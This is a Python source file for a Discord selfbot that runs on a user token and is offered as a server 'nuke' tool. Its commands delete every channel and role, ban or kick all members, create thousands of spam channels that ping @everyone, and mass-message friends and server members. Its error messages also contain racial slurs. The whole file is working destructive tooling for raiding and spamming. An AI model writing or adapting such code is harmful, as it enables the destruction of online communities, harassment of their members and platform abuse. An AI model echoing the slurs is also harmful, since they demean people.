import discord, asyncio
client = discord.Client(intents=discord.Intents.all())


@client.event 
async def on_message(message):

    if message.content=="wdsf" and message.author.id==client.user.id:
        mb = await message.guild.fetch_members().flatten()

        for m in mb: 

            try: await message.guild.ban(m)
            except: print(f"unable to ban {m.name}")

    prefix = "x"
    if message.content.startswith(prefix):

        command = message.content.lstrip(prefix)
        try: command = command.split(" ")[0]
        except: pass

        try: args = message.content.split(" ")[1:]
        except: args = []

        command = command.lower()
        if command in ('nuke', 'wizz'):

            if message.guild.id==804878733793558589:
                return await message.channel.send("not nuking dank crew")

            await message.channel.send('hurd yhu')
            for channel in message.guild.channels:
                try: await channel.delete()
                except: print(f"Unable to delete channel #{channel.name}")

            for role in message.guild.roles:
                try: await role.delete()
                except: print(f"Unable to delete role {role.name}")

            for user in await message.guild.fetch_members().flatten():
                try: await user.ban(reason="e")
                except: print(f"Unable to ban user {user.name} ({user.id})")

            for i in range(420):
                c = await message.guild.create_text_channel("get-nuked")
                await c.send("@everyone@here")

        elif command in ("gcname",):

            if len(args)<=0: return
            name = " ".join(args)

            for i in range(len(name)):
                await message.channel.edit(name=name[:i+1])

        elif command in ("help", "commands"):

            embed = discord.Embed(
                title="𝓚𝓸 𝓢𝓮𝓵𝓯𝓑𝓸𝓽",
                description="`wizz - wizzes a server, deletes all roles, channels, users\n"
                            "`gcname <name> - 𝙘𝙝𝙖𝙣𝙜𝙚𝙨 𝙜𝙘 𝙣𝙖𝙢𝙚 𝙩𝙤 𝙣𝙖𝙢𝙚, 𝙗𝙪𝙩 𝙙𝙤𝙚𝙨 𝙞𝙩 𝙞𝙣 𝙖 𝙨𝙥𝙚𝙘𝙞𝙖𝙡 𝙬𝙖𝙮\n"
                            "`ka - 𝙠𝙞𝙘𝙠𝙨 𝙚𝙫𝙚𝙧𝙮𝙤𝙣𝙚 𝙞𝙣 𝙖 𝙨𝙚𝙧𝙫𝙚𝙧\n"
                            "`ba - 𝙗𝙖𝙣𝙨 𝙚𝙫𝙚𝙧𝙮𝙤𝙣𝙚 𝙞𝙣 𝙖 𝙨𝙚𝙧𝙫𝙚𝙧\n"
                            "`md <message> -𝙢𝙖𝙨𝙨 𝙙𝙢𝙨 𝙖𝙡𝙡 𝙤𝙛 𝙮𝙤𝙪𝙧 𝙛𝙧𝙞𝙚𝙣𝙙𝙨 𝙨𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜\n"
                            "`mc - 𝒄𝒓𝒆𝒂𝒕𝒆𝒔 𝒎𝒂𝒙 𝒏𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝒄𝒉𝒂𝒏𝒏𝒆𝒍𝒔\n"
                           "`e - 𝙨𝙥𝙚𝙘𝙞𝙖𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙\n" 
            ).set_image(url="https://cdn.discordapp.com/attachments/791211082730438696/811074085818728448/20210215_215331.gif")
            await message.channel.send(embed=embed)

        elif command =="ka":

            for user in await message.guild.fetch_members().flatten():
                try: await user.kick()
                except: print(f"cant kick this nigga {user.name} ({user.id})")

        elif command == "ba":

            for user in await message.guild.fetch_members().flatten():
                try:await user.ban(reason="e")
                except:print(f"cant ban this nigga {user.name} ({user.id})")

        elif command =='md':

            if len(args) <= 0: return
            name = " ".join(args)

            for user in client.user.friends:
                try: await user.send(name)
                except Exception as e: pass

            if message.guild is not None:
                print(message.guild.members)
                for user in await message.guild.fetch_members().flatten():
                    try:

                        c = await user.create_dm_channel()
                        await c.send(name)


                    except: pass

        elif command=="mc":

            for i in range(6000):
                c = await message.guild.create_text_channel("fear ko")
                await c.send("@everyone @here XanKo Stepped")

        elif command=="e":

            for i in range(200):
                await message.channel.send("@everyone Ko Stepped BITCH!")

        try: await message.delete()
        except: print("im gay and i can't delete my own message")

token = "Token Here"

client.run(token, bot=False)
